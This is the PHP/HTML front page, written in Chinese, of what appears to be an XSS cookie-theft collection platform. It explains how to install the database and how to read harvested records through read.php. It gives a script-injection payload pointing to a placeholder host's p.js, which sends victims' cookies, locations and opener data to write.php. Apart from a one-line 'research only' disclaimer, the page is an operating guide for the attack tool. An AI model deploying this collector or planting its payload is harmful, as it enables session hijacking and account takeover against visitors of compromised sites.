<?php require_once('config.php'); ?>
<!doctype html>
<html>
<head>
<title>首页_<?php echo $website_name; ?></title>

<meta charset="utf-8" />
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<link rel="stylesheet" type="text/css" href="style/color.css" />
<link rel="stylesheet" type="text/css" href="style/main.css" />
</head>

<body>
	<div>
		<h1><?php echo $website_name; ?></h1>
		<p>
			<b>警告</b>：此网络应用程序仅供学习研究目的使用，请勿用于违法犯罪活动，否则一切后果自负！
		</p>
		<p>
			本程序适用于MySQL数据库，部署代码前应在config.php中写入数据库连接等信息。<br /> 使用前请先<a
				href="install.php"><b>点击此处</b></a>在数据库中创建表。 <a href="testMySql.php"
				target="_blank"><b>点此测试数据库连接</b></a>
		</p>
		<p>
			<b>写入方法：</b>请求write.php，Method包括GET和POST，参数为domain location toplocation cookie opener<br />
			可直接使用p.js，例如插入&lt;script&nbsp;src=http://xxx.xxx/p.js&gt;&lt;/script&gt;
		</p>
		<p>
			<b>读取方法</b>：<a href="read.php" target="_blank"><b>read.php</b></a>
		</p>
		<p>如果设置了密码，请在请求中附加参数：pwd=YOURPASSWORD</p>
		<p>
			修改网站配色<a href="color.php" target="_blank">color.php</a>
		</p>
		<p><?php echo $dev_info;?></p>
	</div>
</body>
</html>